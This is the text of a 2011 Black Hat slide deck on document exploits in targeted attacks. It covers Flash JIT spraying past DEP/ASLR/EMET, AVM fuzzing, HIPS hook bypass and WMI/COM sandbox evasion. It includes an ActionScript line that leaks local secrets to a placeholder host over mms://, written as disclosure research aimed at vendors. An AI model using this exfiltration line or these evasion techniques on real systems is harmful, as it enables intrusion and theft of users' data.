Weapons of Targeted Attack
Modern Document Exploit Techniques

Ming-chieh Pan Sung-ting Tsai

<naninb@gmail.com> <ttsecurity@gmail.com>
Black Hat USA 2011

Who we are?
Security researchers from Taiwan And members of CHROOT security group

Ming-chieh Pan (a.k.a Nanika)

· Senior vulnerability

· Disclosed

researcher of Net-Hack Inc.

· CVE-2006-3431 (Excel)

· Research on

· CVE-2006-5296 (PowerPoint)

· Vulnerability research

·...

· Exploit techniques

· Talks and Speeches

· Malware detection · Mobile security
· Windows platform · Malicious document

· Syscan Singapore/Taipei/Hong Kong 08/10
· Hacks in Taiwan 05/06/07/09/10

techniques

Sung-ting Tsai (a.k.a TT)
· Research engineer in core tech department of Trend Micro · Leader of CHROOT security group · Research on
· Document exploit · Malware auto-analyzing system (sandbox technologies) · Malware detection · System vulnerability and protection · Web security · Cloud and virtualization security
· Talks and speeches
· Hacks in Taiwan Conference 08' · Syscan Singapore 10'

Agenda
· Motivation · APT and Targeted Attack · Recent document exploit techniques · Future document exploit techniques · Conclusion

Motivation
· APT (Advanced Persistent Threat) has become very popular in 2011.
· Due to the political issue, Government units and large enterprises in Taiwan has been targeted since 2004.
· They have kept receiving purpose-made e-mails and malwares (exploits), never stopped.
· Nowadays, not only in Taiwan, this kind of silent threat are attacking whole world
· We wish application and security vendors could be aware of the attack and have new approaches to protect people.

Targeted Attack
· They are hacking for the information, not for profit. · Most of security software couldn't do protection
effectively. · The most common way of targeted attack and not easy
to be aware of. ­ Attacker sends an e-mail with specific content and
document exploit (antivirus couldn't detect) to his targets. After open the document, attacker could take control of the victim's system. ­ The malicious document usually includes malicious web page (attacking browsers), office document, PDF, and Flash. · Document exploit is actually the weapon of targeted attack.

Cat and Mouse Game
· Vendors keep patching application and inventing new technologies to prevent attack.
· Attackers always can find ways to defeat those protections.
· If we could be ahead of attackers by guessing their next tricks, we might have better protections for people.

Recent document exploit techniques

Hybrid Document Exploit
· If you have installed all Microsoft office patches, and there is no 0-day vulnerability and exploit. Will it be 100% safe to open a word or excel document?

Hybrid Document Exploit
· Modern document application is very complicated. Most of them could embed document objects of other applications.
· For example, the Excel could embed an Adobe flash object. In this case, even your Excel is up to date, it is still not 100% safe when you open an Excel document which includes a flash object and your flash application is vulnerable.
· Most of people know browser could include a lot of document objects, so they are cautious when they open web page. However, when they open a document in the e-mail, they would not be aware of the danger.
· This kind of attack is very popular recently. A flash vulnerability could be repacked as a malicious web page, a PDF exploit, or even an office document exploit.

Incomplete Protection
· The exploit mitigation techniques could do really good jobs to avoid execution of exploits, e.g. DEP and ASLR.
· However, it is very difficult to do protections completely.
· For example, even you have adopted DEP and ASLR, there are always some researchers could find some modules are not protected by ASLR.

Advanced Memory Attack Techniques
· Techniques
­ ROP ­ Flash JIT Spraying
· Vendor responses
­ Flash has started to encode/encrypt AVM code area since version 10.1
­ Microsoft's Enhanced Mitigation Experience Toolkit (EMET)

Do you know why attackers don't include a flash exploit in web page or PDF file?
They only use Excel to spread malicious e-mails.

Future Document Exploit Techniques

Advanced Fuzzing Techniques
· Focus on code area and AVM instructions.
· 255 -> 170

Advanced Fuzzing Techniques
Instructions Pushint index

in throw

Random compositions

insert

SWF
Method_ body

Pushuint index

coerce index

debugfile index

...

Advanced Fuzzing Techniques
· It reduces the testing range and save a lot of time.
· We use the approach to fuzz the CVE-20101297, and we also discovered APSB11-12 before it is disclosed. (By inserting a Setlocal_1 (0xd5) in code area).
· We accidently found the JIT spraying technique could still work during the automatic fuzzing process.

Techniques to Against Exploit Mitigation Technologies

Flash JIT Spraying
· The magic B4 (IN) instruction.
­ If we replace the first XOR(AA) with IN(B4), the AVM code area will not be encoded in memory.

Flash JIT Spraying
· Continuity of sprayed area
­ Original trick used a loop to load the spraying file a lot of times to do JIT spraying. However, this approach has bad continuity in new version of Flash.
­ In order to have better continuity, instead of reloading another swf file, we make a lot of method_body in a swf file directly. This approach has much better result.
· In our testing, we have around 10000 method_body in the sample file and each method_body (function) includes 2048 XOR instructions.
· This technique produces a huge file (58.7MB). Zlib could help us to solve the problem. After compression, the sample file size is 268k bytes.

Flash JIT Spraying
· Use OR
­ We use OR(A9) instead of XOR(AA) to spray the memory. Instead of '35 90 90 90 3C', the content in memory will be `0D 0D 0D 0D 0C'.
· This technique makes it easier to jump into our sprayed area when trigger the vulnerability.

Flash JIT Spraying

· It works everywhere.
Protection
Office2000 ~Office 2010 (DEP AlwaysOn, ASLR) Internet Explorer (DEP AlwaysOn, ASLR) Adobe PDF (DEP AlwaysOn, ASLR) EMET v2.1 (Enabled all functions)

New JIT Spraying with Flash Player 10.3.181.34 (Released 6/28/2011)
works works works works

Techniques to Bypass Sandbox / Policy / Access control

Flash Sandbox Problem
· There are 4 types of properties in Flash Security.SandboxType:
­ Security.REMOTE ­ Security.LOCAL_WITH_FILE ­ Security.LOCAL_WITH_NETWORK ­ Security.LOCAL_TRUSTED
· The basic idea is if you can access network, you can't access local resource, vice versa.
· The flaw is in its `url protocol' design

Flash Sandbox Problem
· We embed a Flash object in an Office document. This flash object is allowed to access local files, and not allowed to access internet.
· However there is a problem when handling the `mms' protocol.
· When the flash object opens an mms link, IE will be launched, and then media player will also be launched (by IE) as well. The media player will connect to the link.

Flash Sandbox Problem
· Using this flaw, we could retrieve user information, and use mms protocol to send information to internet.
· For example, we might steal user's cookie, user's saved password, etc. And we could use this technique to probe user environment.
var uname = "mms://x.x.x.x:1755/"+secret.contents+".asx"; var req = new URLRequest(uname); navigateToURL(req,"_blank");

Techniques to defeat behavior based protection and auto-analyzing sandbox

Bypass Inline Hook
· Many HIPS use inline hook to intercept API and monitor behaviors.
· Most of them are using Microsoft Detour library or Detourlike approach.
· Bypassing this kind of API hooking, we many just skip a few begging bytes.

Bypass Inline Hook

Address 0x7C82D146
API is hooked by Detours

CreateProcessInternalW Push 0x608 Detours _ jmp functon push offset stru_7C82D450 call __SEH_prolog mov eax, dword_7C88B7B0 mov [ebp+var_1C], eax

Calling an API

Bypass call (Create the same value in stack) Jmp 0x7C82D146+5

WMI and COM Objects
· In case of exploit is launched, traditional signature based malware protection is useless, because the exploit or malware is usually 'customized`.
· Users can only rely on behavior based protection. · The HIPS usually does hook to observe malicious behaviors
(No matter in ring0 or ring3). Once it detects a suspicious behavior, it would check `who' is doing this by identifying the process. · Try to imagine, if legitimate process could do things for us, the HIPS would become useless.

WMI and COM Objects
· We noticed that Microsoft has already provided complete solutions ­ the WMI and many useful COM objects.
· By leveraging the technologies, system process could do everything for us, including connecting to Internet, access files/registries, and even installing a MSI file.
· Not only defeating HIPS, the approach could also defeat automation analyzing sandbox system.
· The malware `process' actually does nothing directly. The sandbox could record nothing if the sandbox only tracks malware process.

NET

COM

Process COM Malware COM

REG

CO M

FILE

Conclusion
· We have discussed complete solutions to make a weapon of targeted attack with many new techniques:
­ How to find vulnerabilities: AVM fuzzing technique. ­ How to defeat exploit mitigation technologies: new JIT spraying. ­ How to make an exploit without memory hard work: attack policy flaw. ­ How to defeat desktop protection and analyzing system: WMI and
COM
· We believe attackers are working hard on these topics. We wish security vendors could address these problems to come out solutions ahead of attackers.

